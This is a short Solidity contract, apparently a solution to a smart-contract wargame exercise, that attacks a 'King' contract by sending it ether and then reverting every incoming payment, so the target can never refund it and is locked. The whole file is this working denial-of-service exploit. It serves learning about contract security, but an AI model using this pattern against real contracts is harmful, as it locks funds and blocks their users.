// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import './King.sol';

contract ExoSeven {

  King king;

  constructor(address payable _targetContract) public payable{
    king =  King(_targetContract);
  }

  function execute() public {
    address(king).call{value: 100, gas: 100000}("");
  }
  
  receive() external payable {
    revert();
  }  
}